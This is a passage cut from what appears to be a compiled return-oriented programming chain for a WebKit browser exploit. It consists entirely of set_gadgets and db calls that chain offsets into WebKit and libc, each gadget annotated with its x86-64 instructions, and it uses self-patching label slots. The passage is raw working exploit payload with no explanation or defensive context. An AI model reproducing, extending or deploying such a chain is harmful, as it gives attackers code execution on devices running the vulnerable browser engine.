set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+118856, //L1378
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+118872, //L1379
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1378:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1379:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+118960, //L1380
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1380:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+119016, //L1382
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1382:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+119088, //L1384
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1384:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+119144, //L1386
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1386:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L1388:
libc_base+165442, //pop rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+119296, //L1390
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1389:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1390:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+119400, //L1393
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+119384, //L1392
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1392:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1393:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+119544, //L1397
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+119512, //L1395
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+119528, //L1396
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1395:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1396:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1397:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+119616, //L1398
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1398:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+119672, //L1400
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1400:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+119784, //L1404
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1402:
db([30, 0]); // 0x1e
set_gadget(libc_base+772328,); //pop rcx
//L1403:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1404:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+119864, //L1405
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+119880, //L1406
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1405:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1406:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+119968, //L1407
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1407:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+120024, //L1409
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1409:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+120096, //L1411
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1411:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+120152, //L1413
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1413:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+120256, //L1416
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1415:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L1416:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+120360, //L1419
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+120344, //L1418
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1418:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1419:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+120504, //L1423
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+120472, //L1421
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+120488, //L1422
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1421:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1422:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1423:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+120576, //L1424
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1424:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+120632, //L1426
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1426:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+120744, //L1430
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1428:
db([7, 0]); // 0x7
set_gadget(libc_base+772328,); //pop rcx
//L1429:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1430:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+120824, //L1431
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+120840, //L1432
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1431:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1432:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278, //pop rsi
ropchain+120928, //L1433
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1433:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+120984, //L1435
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1435:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+121104, //L1438
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1437:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1438:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+121208, //L1441
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+121192, //L1440
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1440:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1441:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+121352, //L1445
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+121320, //L1443
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+121336, //L1444
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1443:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1444:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1445:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+121424, //L1446
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1446:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+121480, //L1448
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1448:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+121592, //L1452
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1450:
db([31, 0]); // 0x1f
set_gadget(libc_base+772328,); //pop rcx
//L1451:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1452:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+121672, //L1453
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+121688, //L1454
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1453:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1454:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+121776, //L1455
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1455:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+121832, //L1457
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1457:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+121904, //L1459
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1459:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+121960, //L1461
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1461:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
//L1463:
libc_base+768796, //pop rax
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+122112, //L1465
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1464:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1465:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+122216, //L1468
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+122200, //L1467
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1467:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1468:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+122360, //L1472
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+122328, //L1470
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+122344, //L1471
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1470:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1471:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1472:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+122432, //L1473
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1473:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+122488, //L1475
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1475:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+122600, //L1479
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1477:
db([32, 0]); // 0x20
set_gadget(libc_base+772328,); //pop rcx
//L1478:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1479:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+122680, //L1480
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+122696, //L1481
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1480:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1481:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+122784, //L1482
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1482:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+122840, //L1484
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1484:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+122912, //L1486
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1486:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+122968, //L1488
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1488:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2989859, //mov [rax], rcx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+123072, //L1491
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1490:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1491:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+123176, //L1494
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+123160, //L1493
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1493:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1494:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+123320, //L1498
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+123288, //L1496
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+123304, //L1497
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1496:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1497:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1498:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+123392, //L1499
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1499:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+123448, //L1501
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1501:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+123560, //L1505
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1503:
db([37, 0]); // 0x25
set_gadget(libc_base+772328,); //pop rcx
//L1504:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1505:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+123640, //L1506
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+123656, //L1507
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1506:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1507:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+123744, //L1508
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1508:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+123800, //L1510
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1510:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+123920, //L1513
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1512:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1513:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+124024, //L1516
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+124008, //L1515
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1515:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1516:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+124168, //L1520
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+124136, //L1518
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+124152, //L1519
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1518:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1519:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1520:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+124240, //L1521
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1521:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+124296, //L1523
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1523:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+124408, //L1527
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1525:
db([33, 0]); // 0x21
set_gadget(libc_base+772328,); //pop rcx
//L1526:
db([8, 0]); // 0x8
set_gadget(webkit_base+3789839,); //pop r11
//L1527:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1537212, //imul rax, rcx
libc_base+713278, //pop rsi
ropchain+124488, //L1528
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+124504, //L1529
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1528:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1529:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+124592, //L1530
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1530:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+124648, //L1532
